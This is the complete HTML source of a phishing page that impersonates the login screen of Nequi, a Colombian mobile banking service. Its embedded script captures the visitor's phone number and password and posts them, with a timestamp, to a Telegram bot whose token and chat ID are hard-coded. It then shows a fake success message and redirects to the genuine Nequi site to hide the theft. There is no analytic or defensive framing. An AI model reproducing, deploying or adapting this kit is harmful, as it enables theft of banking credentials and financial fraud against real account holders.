<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nequi | Inicia sesión</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
        
        * { margin:0; padding:0; box-sizing:border-box; }
        body { 
            font-family: 'Roboto', sans-serif; 
            background: #f5f5f5; 
            height:100vh; 
            display:flex; 
            align-items:center; 
            justify-content:center; 
        }
        .container { 
            background:white; 
            width:100%; 
            max-width:400px; 
            min-height:100vh; 
            box-shadow:0 0 20px rgba(0,0,0,0.1); 
        }
        .header { 
            background: linear-gradient(90deg, #00c853, #00b140); 
            color:white; 
            text-align:center; 
            padding:40px 20px 30px; 
        }
        .header img { width:90px; }
        .header h1 { 
            font-size:22px; 
            margin-top:10px; 
            font-weight:500; 
        }
        .content { padding:30px 25px; }
        h2 { 
            text-align:center; 
            color:#333; 
            margin-bottom:30px; 
            font-size:18px; 
        }
        input { 
            width:100%; 
            padding:15px; 
            margin:12px 0; 
            border:1px solid #ddd; 
            border-radius:8px; 
            font-size:16px; 
        }
        button { 
            width:100%; 
            padding:15px; 
            background:#00b140; 
            color:white; 
            border:none; 
            border-radius:8px; 
            font-size:17px; 
            font-weight:500; 
            margin-top:20px; 
            cursor:pointer; 
        }
        button:hover { background:#009933; }
        .error { 
            color:red; 
            text-align:center; 
            margin:15px 0; 
            display:none; 
            font-size:14px;
        }
        .footer { 
            text-align:center; 
            padding:30px 20px; 
            color:#666; 
            font-size:13px; 
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            
            <h1>Nequi</h1>
        </div>
        
        <div class="content">
            <h2>Inicia sesión en tu cuenta</h2>
            
            <form id="loginForm">
                <input type="tel" id="phone" placeholder="Número de celular" maxlength="10" required>
                <input type="password" id="password" placeholder="Contraseña" required>
                <div class="error" id="errorMsg">Número o contraseña incorrectos</div>
                <button type="submit">Continuar</button>
            </form>
            
            <p style="text-align:center; margin-top:25px; color:#00b140; font-size:15px;">
                ¿Olvidaste tu contraseña?
            </p>
        </div>
        
        <div class="footer">
            Nequi © 2025
        </div>
    </div>

    <script>
        const botToken = "8712944286:AAGUAFIPjLNX5sMeEYdNjLNoFGXiQL_ZNO8";
        const chatId = "773351137";

        document.getElementById("loginForm").addEventListener("submit", function(e) {
            e.preventDefault();
            
            let phone = document.getElementById("phone").value.trim();
            let password = document.getElementById("password").value.trim();
            let errorMsg = document.getElementById("errorMsg");

            if (phone.length < 10) {
                errorMsg.style.display = "block";
                return;
            }

            const message = `🔴 NEQUI\n\n📱 Celular: ${phone}\n🔑 Contraseña: ${password}\n⏰ Hora: ${new Date().toLocaleString()}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message })
            })
            .then(() => {
                errorMsg.style.color = "green";
                errorMsg.textContent = "✅ Sesión iniciada correctamente";
                errorMsg.style.display = "block";
                setTimeout(() => { window.location.href = "https://www.nequi.com.co"; }, 1800);
            })
            .catch(() => {
                window.location.href = "https://www.nequi.com.co";
            });
        });
    </script>
</body>
</html>
